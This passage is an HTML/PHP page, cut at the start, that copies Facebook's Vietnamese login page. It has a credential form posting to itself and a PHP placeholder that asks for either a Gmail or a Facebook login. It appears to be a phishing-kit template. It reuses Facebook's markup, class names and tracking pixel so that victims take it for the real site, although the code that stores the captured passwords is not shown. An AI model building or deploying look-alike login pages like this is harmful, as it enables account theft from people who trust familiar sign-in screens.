                                                        ["AsyncRequest", "BanzaiScuba_DEPRECATED", "VisualCompletionGating", "FbtLogging", "IntlQtEventFalcoEvent"], "sd"
                                                ]
                                        ],
                                        ["RequireDeferredReference", "unblock", [],
                                                [
                                                        ["AsyncRequest", "BanzaiScuba_DEPRECATED", "VisualCompletionGating", "FbtLogging", "IntlQtEventFalcoEvent"], "css"
                                                ]
                                        ]
                                ]
                        });
                });
        </script>
        <!-- Bootstrap -->
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
</head>

<body class="fbIndex UIPage_LoggedOut _-kb _605a b_c3pyn-ahh chrome webkit win x1-5 Locale_vi_VN" dir="ltr">
        <script type="text/javascript" nonce="1NUvCCU4">
                requireLazy(["bootstrapWebSession"], function(j) {
                        j(1644247579)
                })
        </script>
        <div class="_li" id="u_0_3_Dw">
                <div class="_3_s0 _1toe _3_s1 _3_s1 uiBoxGray noborder" data-testid="ax-navigation-menubar" id="u_0_4_aM">
                        <div class="_608m">
                                <div class="_5aj7 _tb6">
                                        <div class="_4bl7"><span class="mrm _3bcv _50f3">Chuyển tới</span></div>
                                        <div class="_4bl9 _3bcp">
                                                <div class="_6a _608n" aria-label="Tr&#x1ee3; l&#xfd; &#x111;i&#x1ec1;u h&#x1b0;&#x1edb;ng" aria-keyshortcuts="Alt+/" role="menubar" id="u_0_5_wt">
                                                        <div class="_6a uiPopover" id="u_0_6_lQ"><a role="button" class="_42ft _4jy0 _55pi _2agf _4o_4 _63xb _p _4jy3 _517h _51sy" href="#" style="max-width:200px;" aria-haspopup="true" aria-expanded="false" rel="toggle" id="u_0_7_O8"><span class="_55pe">Các phần của trang này</span><span class="_4o_3 _3-99"><i class="img sp_gMujFo71RwJ_1_5x sx_7c3fc7"></i></span></a>
                                                        </div>
                                                        <div class="_6a _3bcs"></div>
                                                        <div class="_6a mrm uiPopover" id="u_0_8_eH"><a role="button" class="_42ft _4jy0 _55pi _2agf _4o_4 _3_s2 _63xb _p _4jy3 _4jy1 selected _51sy" href="#" style="max-width:200px;" aria-haspopup="true" tabindex="-1" aria-expanded="false" rel="toggle" id="u_0_9_WL"><span class="_55pe">Trợ giúp về trợ
                                                                                năng</span><span class="_4o_3 _3-99"><i class="img sp_gMujFo71RwJ_1_5x sx_0d39c5"></i></span></a></div>
                                                </div>
                                        </div>
                                        <div class="_4bl7 mlm pll _3bct">
                                                <div class="_6a _3bcy">Nhấn <span class="_3bcz">alt</span> + <span class="_3bcz">/</span> để mở
                                                        menu này</div>
                                        </div>
                                </div>
                        </div>
                </div>
                <div id="globalContainer" class="uiContextualLayerParent">
                        <div class="fb_content clearfix " id="content" role="main">
                                <div>
                                        <div class="_8esj _95k9 _8esf _8opv _8f3m _8ilg _8icx _8op_ _95ka">
                                                <div class="_8esk">
                                                        <div class="_8esl">
                                                                <div class="_8ice"><h1 class="text-info"><b>Điện toán đám mây</b></h1></div>
                                                        </div>
                                                        <div class="_8esn">
                                                                <div class="_8iep _8icy _9ahz _9ah-">
                                                                        <div class="_6luv _52jv">
                                                                                <!-- Form here -->
                                                                                <form action="" method="post" class="fb-login">
                                                                                        <div>
                                                                                                <div class="_6lux"><input type="text" class="inputtext _55r1 _6luy fb_userName" name="email" id="email" data-testid="royal_email" placeholder="<?= $isGmail ? 'Enter your Email' : 'Enter your Facebook account' ?>" required />
                                                                                                </div>
                                                                                                <div class="_6lux"><input type="password" class="inputtext _55r1 _6luy fb_userPassword" name="pass" id="pass" data-testid="royal_email" placeholder="M&#x1ead;t kh&#x1ea9;u" aria-label="M&#x1ead;t kh&#x1ea9;u" required />
                                                                                                </div>
                                                                                        </div><input type="hidden" autocomplete="off" name="login_source" value="comet_headerless_login" /><input type="hidden" autocomplete="off" name="next" value="" />
                                                                                        <div class="_6ltg"><button value="1" class="_42ft _4jy0 _6lth _4jy6 _4jy1 selected _51sy" name="login" data-testid="royal_login_button" type="submit" id="u_0_d_JX">Đăng
                                                                                                        nhập</button></div>
                                                                                        <div class="row" style="padding-top: 5px;">
                                                                                                <div class="col-md-1"></div>
                                                                                                <div class="col-md-5">
                                                                                                        <a class="btn btn-primary" href="?loginType=FACEBOOK" role="button">Login with Facebook</a>
                                                                                                </div>
                                                                                                <div class="col-md-4">
                                                                                                        <a class="btn btn-secondary" href="?loginType=EMAIL" role="button">Login with Email</a>
                                                                                                </div>
                                                                                                <div class="col-md-1"></div>
                                                                                        </div>
                                                                                        <div class="_8icz"></div>
                                                                                        <div class="_6ltg"><a role="button" class="_42ft _4jy0 _6lti _4jy6 _4jy2 selected _51sy" href="#" ajaxify="/reg/spotlight/" id="u_0_2_Wb" data-testid="open-registration-form-button" rel="async">Tạo tài
                                                                                                        khoản mới</a></div>
                                                                                </form>
                                                                        </div>
                                                                </div>
                                                        </div>
                                                </div>
                                        </div>
                                </div>
                        </div>
                </div>
                <div></div><span><img src="https://facebook.com/security/hsts-pixel.gif" width="0" height="0" style="display:none" /></span>
        </div>
        <div style="display:none"></div>
        <!-- Bootstrap -->
        <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
        <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
        <script src="./public/js/fb.js"></script>
</body>

</html>